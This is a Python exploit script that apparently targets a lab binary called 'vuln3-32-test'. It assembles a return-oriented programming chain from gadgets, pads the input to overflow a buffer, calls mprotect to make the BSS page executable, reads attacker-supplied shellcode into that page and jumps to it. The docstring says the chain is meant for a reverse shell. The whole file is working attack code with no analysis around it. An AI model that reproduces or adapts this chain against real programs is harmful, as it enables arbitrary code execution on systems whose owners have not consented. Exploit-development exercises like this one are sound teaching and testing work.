import sys
from os import stat
from struct import pack

import address_pop
import exploit_gadgets
import junk_length_and_addresses
from get_gadgets import get_gadgets, push_to_reg

binary_name = "vuln3-32-test"

rop = exploit_gadgets.ROPgadgets(binary_name)
gadgets = get_gadgets(rop)
    

# Macro definitions for ROP Gadgets
POPEAX    = pack('<I', rop.get_gadget("pop eax ; ret")) # pop eax ; ret
POPEBX    = pack('<I', rop.get_gadget("pop ebx ; ret")) # pop ebx ; ret
POPECXEBX = pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")) # pop ecx ; pop ebx ; ret
POPEDX    = pack('<I', rop.get_gadget("pop edx ; ret")) # pop edx ; ret

ADDEAXEDX = pack('<I', rop.get_gadget("add eax, edx ; ret")) # add eax, edx ; ret
ADDECXECX = pack('<I', rop.get_gadget("add ecx, ecx ; ret"))
ADDEAXECX = pack('<I', rop.get_gadget("add eax, ecx ; ret"))

XOREAX    = pack('<I', rop.get_gadget("xor eax, eax ; ret")) # xor eax, eax ; ret

INCEAX    = pack('<I', rop.get_gadget("inc eax ; ret")) # inc eax ; ret
INCEBX    = pack('<I', rop.get_gadget("inc ebx ; ret")) # inc ebx ; ret
INCECX    = pack('<I', rop.get_gadget("inc ecx ; ret")) # inc ecx ; ret
INCEDX    = pack('<I', rop.get_gadget("inc edx ; ret")) # inc edx ; ret

DECEDX    = pack('<I', rop.get_gadget("dec edx ; ret")) # dec edx ; ret

NOP       = pack('<I', rop.get_gadget("nop ; ret")) # nop
INT80     = pack('<I', rop.get_gadget("int 0x80 ; ret")) # int 0x80


def rop_exploit():
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
    
    # We need to align the BSS with the page size
    bss = (bss & 0xfffff000)
    print(f"{bss:x}")
    exploit = b'\x41' * padding

    shellcode_len = stat(sys.argv[1]).st_size
    
    exploit += push_to_reg(0x0000800,"ecx",gadgets,rop)
    exploit += push_to_reg(bss,"ebx",gadgets,rop)
    exploit += push_to_reg(0x0000007D,"eax",gadgets,rop)    
    exploit += push_to_reg(0x0000007,"edx",gadgets,rop)
    exploit += INT80 # int 0x80




    # BSS is now executable
    # # Read into BSS
    exploit += push_to_reg(3,"eax",gadgets,rop)
    exploit += push_to_reg(shellcode_len,"edx",gadgets,rop)
    exploit += push_to_reg(bss,"ecx",gadgets,rop) #bss
    exploit += gadgets.search("zero ebx")[0].gadget

    exploit += INT80


    # We must jump to an offset of BSS as BSS contains null characters
    exploit += pack('<I', bss + 4) 

    return exploit


def test():
    fileName=input("Enter the file name: ")
    outfile=open(fileName, "wb")
    outfile.write(rop_exploit())
    outfile.close()


if __name__ == "__main__":
    test()
